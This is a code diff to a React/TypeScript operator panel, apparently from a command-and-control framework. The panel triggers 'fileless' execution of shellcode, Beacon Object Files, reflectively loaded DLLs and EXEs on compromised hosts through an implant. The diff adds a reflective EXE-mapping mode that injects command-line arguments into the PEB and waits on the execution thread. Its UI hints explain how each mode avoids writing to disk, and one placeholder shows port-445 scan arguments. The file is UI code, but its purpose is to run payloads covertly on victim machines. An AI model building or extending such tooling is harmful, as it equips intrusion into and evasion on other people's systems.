@@ -7,13 +7,18 @@ interface FilelessExecPanelProps {
   session: Session
 }
 
-type FilelessKind = 'shellcode' | 'bof' | 'dll' | 'exe'
+type FilelessKind = 'shellcode' | 'bof' | 'dll' | 'exe' | 'exe_mem'
 
 const KINDS: { value: FilelessKind; label: string; hint: string }[] = [
   { value: 'shellcode', label: 'Shellcode', hint: '原始位置无关字节码，VirtualAlloc + CreateThread 内存执行' },
   { value: 'bof', label: 'BOF', hint: 'Beacon Object File（COFF），全程内存执行，无需落盘' },
   { value: 'dll', label: 'DLL', hint: '反射式 PE 加载：内存映射 + 重定位 + 导入表修复，不落盘' },
-  { value: 'exe', label: 'EXE', hint: '服务端用 donut 转位置无关 shellcode 后内存执行，不落盘' },
+  { value: 'exe', label: 'EXE (donut)', hint: '服务端用 donut 把 EXE 转成位置无关 shellcode 后内存执行；跨架构可用，但 donut 的参数机制对 EXE 的 argv 不一定生效' },
+  {
+    value: 'exe_mem',
+    label: 'EXE (反射映射·带参数)',
+    hint: '植入端直接反射映射 EXE 并把「参数 args」注入 PEB 命令行（argv 生效）；要求与植入体同架构；载荷自行退出可能带走植入体，跑完即退的工具请用落地执行',
+  },
 ]
 
 /** 读取文件为纯 base64（去除 data URL 前缀） */
@@ -57,6 +62,8 @@ export function FilelessExecPanel({ session }: FilelessExecPanelProps) {
   const [args, setArgs] = useState('')
   const [entry, setEntry] = useState('')
   const [arch, setArch] = useState('amd64')
+  // exe_mem：等待执行线程结束的毫秒数（0 = 不等，后台线程继续跑）
+  const [waitMs, setWaitMs] = useState(8000)
   const [loading, setLoading] = useState(false)
   const [output, setOutput] = useState('')
 
@@ -88,6 +95,8 @@ export function FilelessExecPanel({ session }: FilelessExecPanelProps) {
         args: args || undefined,
         entry: entry || undefined,
         arch: kind === 'exe' ? arch : undefined,
+        // exe_mem：等待执行线程结束的毫秒数（0 = 立即返回，程序在后台线程继续跑）
+        wait_ms: kind === 'exe_mem' ? waitMs : undefined,
       })
       const taskId = resp.data?.task_id
       if (!taskId) throw new Error('未返回 task_id')
@@ -192,29 +201,29 @@ export function FilelessExecPanel({ session }: FilelessExecPanelProps) {
 
       <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 10 }}>
         <div>
-          <label style={labelStyle}>参数 args（BOF 用）</label>
+          <label style={labelStyle}>参数 args（BOF / EXE 命令行）</label>
           <input
             type="text"
             value={args}
             onChange={(e) => setArgs(e.target.value)}
-            placeholder="可选"
+            placeholder={kind === 'exe_mem' ? '如 -h 10.0.0.1 -p 445（作为被内存执行 EXE 的 argv）' : '可选'}
             style={inputStyle}
-            disabled={kind !== 'bof'}
+            disabled={kind !== 'bof' && kind !== 'exe' && kind !== 'exe_mem' && kind !== 'dll'}
           />
         </div>
         <div>
-          <label style={labelStyle}>导出函数 entry（DLL 用）</label>
+          <label style={labelStyle}>导出函数 entry（DLL）/ 镜像名（EXE（reflective））</label>
           <input
             type="text"
             value={entry}
             onChange={(e) => setEntry(e.target.value)}
-            placeholder="可选，如 DllMain / Run"
+            placeholder={kind === 'exe_mem' ? '可选，argv[0]，如 tool.exe' : '可选，如 DllMain / Run'}
             style={inputStyle}
-            disabled={kind !== 'dll'}
+            disabled={kind !== 'dll' && kind !== 'exe_mem'}
           />
         </div>
         <div>
-          <label style={labelStyle}>架构 arch（EXE→shellcode）</label>
+          <label style={labelStyle}>架构 arch（EXE→shellcode）/ 等待毫秒（反射映射）</label>
           <select
             value={arch}
             onChange={(e) => setArch(e.target.value)}
@@ -225,6 +234,16 @@ export function FilelessExecPanel({ session }: FilelessExecPanelProps) {
             <option value="386">386</option>
             <option value="arm64">arm64</option>
           </select>
+          {kind === 'exe_mem' && (
+            <input
+              type="number"
+              min={0}
+              value={waitMs}
+              onChange={(e) => setWaitMs(Number(e.target.value) || 0)}
+              placeholder="等待毫秒 wait_ms（0=不等）"
+              style={{ ...inputStyle, marginTop: 6 }}
+            />
+          )}
         </div>
       </div>
 
